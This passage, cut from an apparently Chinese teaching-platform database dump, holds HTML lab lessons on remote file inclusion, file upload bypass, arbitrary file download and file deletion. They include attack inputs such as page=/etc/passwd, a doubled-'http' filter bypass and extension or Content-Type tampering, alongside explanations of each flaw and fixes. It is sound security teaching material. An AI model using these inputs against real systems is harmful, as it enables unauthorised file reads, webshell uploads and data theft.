src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>显示一些乱码，表示远程文件包含漏洞测试成功!如果此处包含的是一个黑客自己远程服务器上的webshell则可以直接进行webshell登陆。</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:351.75pt;height:111pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"></v:imagedata></v:shape></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:29:01',1,NULL,'<h2><span style=\"font-size: 14px;\">1）远程文件包含漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr3.png\"></p><p>从上面的代码可以看出服务端接收到前端传递过来的数据以后没做任何过滤和限制。直接通过include去包含，导致文件包含漏洞产生。</p><p>2）远程文件包含漏洞的防范</p><p>方法一：对输入的文件做校验如果发现包含的文件并非系统指定的文件则直接die。</p><p>方法二：在php.ini中配置将allow_url_include修改为off</p><p></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr4.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr5.png\"></p><p><br></p>',1,'<p>1</p>'),(38,'远程文件包含基础训练二','通过攻防教学实验系统中的web系统做远程文件包含漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用远程文件包含漏洞的例子</span><br></h1><p>打开WEB系统本地文件包含漏洞测试页面；如下:</p><p>http://****/vulnerabilities/web/File_contains/fi_include_l/index.php?action=medium&amp;page=include.php</p><p>http://****/vulnerabilities/web/File_contains/fi_include_l/index.php? action=medium&amp;page=/etc/passwd</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:77.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>文件包含成功，并显示系统用户信息。</p><p>测试远程文件包含漏洞,访问百度随便找一个图片地址复制链接；修改page的参数为复制的图片链接信息；如下:</p><p>http://****/vulnerabilities/web/File_contains/fi_include_r/index.php?action=medium&page=http://a1.att.hudong.com/41/11/19300001058918132210114381264.jpg</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:79.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>这次直接包含发现并不能包含成功。我们改成如下链接试试……</p><p><a href=\"http://****/vulnerabilities/web/File_contains/fi_include_r/index.php?action=medium&page=httphttp://://a1.att.hudong.com/41/11/19300001058918132210114381264.jpg\">http://****/vulnerabilities/web/File_contains/fi_include_r/index.php?action=medium&amp;page=httphttp://://a1.att.hudong.com/41/11/19300001058918132210114381264.jpg</a></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:196.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr23.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>显示一些乱码，表示远程文件包含漏洞测试成功!如果此处包含的是一个黑客自己远程服务器上的webshell则可以直接进行webshell登陆。</p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:29:30',1,NULL,'<h2><span style=\"font-size: 14px;\">1）远程文件包含漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr24.png\"></p><p>从上面的代码可以看出服务端接收到前端传递过来的数据以后只是做了简单的替换操作，导致可以绕过。</p><p>我们输入</p><p>httphttp://://a1.att.hudong.com/41/11/19300001058918132210114381264.jpg进过替换以后正好变成</p><p>http://a1.att.hudong.com/41/11/19300001058918132210114381264.jpg</p><p>2）远程文件包含漏洞的防范</p><p>方法一：对输入的文件做校验如果发现包含的文件并非系统指定的文件则直接die。</p><p>方法二：在php.ini中配置将allow_url_include修改为off</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image009.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr25.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr26.png\"></p><p><br></p><p><br></p>',1,'<p>2</p>'),(39,'文件上传基础训练一','通过攻防教学实验系统中的web系统做文件上传漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用文件上传的例子</span></h1><p>打开WEB系统漏洞测试页面；如下:</p><p>http://*****/vulnerabilities/web/File_operation/fileupload/index.php#</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:181.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>在桌面写一个phpinfo()的页面，保存为1.php；然后上传到服务器；上传成功则漏洞测试成功。如下图所示:</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:336pt;height:161.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:336pt;height:161.25pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fu3.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:355.5pt;height:415.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\"></v:imagedata></v:shape></p><p>然后我们通过web页面访问以下：</p><p>http://******/hackable/uploads/1.php</p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:132.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看到其实已经上传成功只不过文件没有执行权限。我们可以去服务器上看一下。</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:6in;height:55.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>说明文件确实上传成功。这个漏洞的意义在于正常的业务本应该是上传图片文件的。但是由于代码缺陷导致上传了其他的文件。正常情况下如果在web解析目录则可以执行任意代码。即使像现在这样上传后不能执行但是依旧存在安全风险。比如上传一个带有xss的html文件。当用户打开以后直接可以获取用户登陆的cookie。</p><p><v:shape id=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:435pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:415.5pt;height:435pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fu7.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:6in;height:158.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.jpg\"></v:imagedata></v:shape></p><h2><br></h2><h2><br></h2><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:30:13',1,NULL,'<h2><span style=\"font-size: 14px;\">1）文件上传漏洞的原理</span><br></h2><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu8.png\">&nbsp;<img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg\"></p><p>通过上面的源码可以看到post得到前端的文件以后没有对文件的后缀以及文件的内容做检查。直接上传到服务器指定的位置，导致任意文件上传漏洞。</p><p>2）文件上传漏洞的防范</p><p>通过检查文件的后缀和文件的内容做强制限制，并且上传的文件名要重新命名。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image015.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu9.png\"></p><p></p><p>类似上面的过滤代码，通过白名单的方式强制过滤检查。</p><p><br></p>',1,'<p>1</p>'),(40,'文件上传基础训练二','通过攻防教学实验系统中的web系统做文件上传漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用文件上传的例子</span><br></h1><p>&nbsp;</p><p>打开WEB系统漏洞测试页面；如下:</p><p>http://*****/vulnerabilities/web/File_operation/fileupload/index.php?action=medium</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:151.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>在桌面写一个phpinfo()的页面，保存为1.php；然后上传到服务器；看看直接是否能上传成功。直接上传发现并不能上传成功。</p><p>这时候需要抓包上传。先上传一个图片后缀的文件，然后抓包修改文件的后缀名。</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:402.75pt;height:205.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:402.75pt;height:205.5pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fu23.png\"><br></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:402.75pt;height:205.5pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fu24.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:315.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:392.25pt;height:6in;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\"></v:imagedata></v:shape></p><p>显示上传成功。</p><p>然后我们通过web页面访问以下：</p><p>http://******/hackable/uploads/1.php</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:6in;height:132.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu25.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看到其实已经上传成功只不过文件没有执行权限。我们可以去服务器上看一下。</p><p><v:shape id=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:6in;height:55.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu26.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>说明文件确实上传成功。这个漏洞的意义在于正常的业务本应该是上传图片文件的。但是由于代码缺陷导致上传了其他的文件。正常情况下如果在web解析目录则可以执行任意代码。即使像现在这样上传后不能执行但是依旧存在安全风险。比如上传一个带有xss的html文件。当用户打开以后直接可以获取用户登陆的cookie。</p><p><v:shape id=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:435pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu27.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:415.5pt;height:435pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fu28.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1032\" type=\"#_x0000_t75\" style=\"width:6in;height:158.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.jpg\"></v:imagedata></v:shape></p><h2><br></h2><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:30:37',1,NULL,'<h2><span style=\"font-size: 14px;\">1）文件上传漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu29.png\"></p><p>通过上面的源码可以看到post得到前端的文件以后只对文件的大小和文件的类型做了限制并没有对文件的后缀做限制。文件的类型在前端通过抓包是可以修改的。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image005.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu210.png\"></p><p>1.php下面的Content-Type:这个字段就代表的文件类型。只需要让这个字段符合代码检测的规范即可上传任意文件。因此这种过滤方法是存在问题的。</p><p>2）文件上传漏洞的防范</p><p>通过检查文件的后缀和文件的内容做强制限制，并且上传的文件名要重新命名。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fu211.png\"></p><p>类似上面的过滤代码，通过白名单的方式强制过滤检查。</p><p></p><p>备注：文件上传还有很多其它场景的绕过方式，这些方式和服务器的类型以及版本有关系。有些文件上传还与代码中使用的特定函数有关系。这些课程我们在以后讲解。</p><p><br></p>',1,'<p>2</p>'),(41,'文件下载基础训练','通过攻防教学实验系统中的web系统做文件下载漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用任意文件下载的例子</span><br></h1><p>&nbsp;</p><p>打开WEB系统漏洞测试页面；如下:</p><p>http://****/vulnerabilities/web/File_operation/filedown/index.php?filename=1.jpg</p><p>鼠标移动到文件下载链接的地方，然后右击审查元素，修改元素filename的值。如：</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:327pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fd1.png\" style=\"line-height: 1; max-width: 100%;\" class=\"\"></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:327pt\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fd2.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:327pt\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fd3.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:327pt\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/fd4.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:204.75pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:151.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:193.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"></v:imagedata></v:shape></p><p>然后点击下载，提示“您要下载的文件已不存在，可能是被删除”；</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:339pt;height:69.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fd5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>继续测试，修改参数test1.txt等去测试。</p><p>http://*****/vulnerabilities/web/File_operation/filedown/down.php?filename=test1.txt</p><p>文件下载成功表示测试通过！</p><p><v:shape id=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:261pt;height:54.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fd6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>上面的测试步骤也可以通过burp抓包测试。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:31:25',1,NULL,'<h2><span style=\"font-size: 14px;\">1）任意文件下载漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/fd7.png\"></p><p>第8行文件直接或者前端输入的文件名然后做了简单的判断直接进入到download函数。</p><p>在download函数中并没有对所要下载的文件做严格的限制。导致本来下载1.jpg但是通过修改数据以后可以下载其他的文件。</p><p>2）任意文件下载漏洞的防范</p><p></p><p>对于所要下载的文件要强制校验文件名，不能直接接收传递过来的参数然后进入下载。</p><p><br></p>',1,'<p>q</p>'),(42,'文件删除基础训练','通过攻防教学实验系统中的web系统做文件删除漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用任意文件删除的例子</span><br></h1><p>&nbsp;</p><p>打开WEB系统漏洞测试页面；如下:</p><p>http://***/webTest/vulnerabilities/web/File_operation/filedelete/index.php</p><p>默认是只能删除1.jpg；利用文件上传中使用的截断方法，对提交的数据进行截获修改文件名称。如下图所示:</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:44.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:60pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img 